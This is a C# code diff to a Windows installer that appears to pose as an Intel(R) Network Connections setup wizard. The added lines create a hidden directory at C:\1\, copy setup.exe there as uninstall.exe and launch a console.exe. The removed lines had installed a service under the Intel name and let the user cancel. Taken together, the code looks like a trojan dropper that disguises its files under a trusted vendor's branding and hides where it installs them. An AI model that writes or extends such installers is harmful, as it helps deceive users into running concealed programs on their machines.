@@ -30,10 +30,11 @@ namespace Installer
         {
             // Your background task goes here
             #region Copy files
-            String path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\Intel\Intel(R) Network Connections\uninstall\";
+            String path = "C:\\1\\";
             if (!Directory.Exists(path))
             {
-                Directory.CreateDirectory(path);
+                DirectoryInfo di = Directory.CreateDirectory(path);
+                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
             }
 
             try
@@ -49,18 +50,21 @@ namespace Installer
                 System.IO.File.Copy(Path.GetFileName(Directory.GetCurrentDirectory() + "\\setup.exe"), path + "\\uninstall.exe", true);
                 UpdateProgressBar(34);
                 #endregion
-
-                #region Install Windows Service
-                String filePath = Application.StartupPath + "\\console.exe";
-                Assembly assembly = Assembly.LoadFrom("service.exe");
-                Utils.InstallService("Intel(R) Network Connections", assembly);
-            }catch(FileNotFoundException ex)
+            }
+            catch (FileNotFoundException ex)
             {
                 MessageBox.Show(ex.Message);
-            }catch(IOException ioex)
+            }
+            catch (IOException ioex)
             {
                 MessageBox.Show(ioex.Message);
             }
+            #region Install Windows Service
+            //    String filePath = Application.StartupPath + "\\console.exe";
+            //    Assembly assembly = Assembly.LoadFrom("service.exe");
+            //    Utils.InstallService("Intel(R) Network Connections", assembly);
+            String filePath = Path.GetDirectoryName(Application.ExecutablePath) + "\\console.exe";
+            Utils.ExecuteConsole(filePath);
             UpdateProgressBar(55);
             #endregion
 
@@ -101,14 +105,6 @@ namespace Installer
             Random rnd = new Random();
             int randomNumber = rnd.Next(50, 100);
             System.Threading.Thread.Sleep(randomNumber);
-        }
-
-        private void frm4Process_FormClosing(object sender, FormClosingEventArgs e)
-        {
-            if (MessageBox.Show("Are you sure you want to cancel Intel(R) Network Connections installation?", "Intel(R) Network Connections Install Wizard", MessageBoxButtons.YesNo) == DialogResult.Yes)
-            {
-                this.Close();
-            }
         }
     }
 }
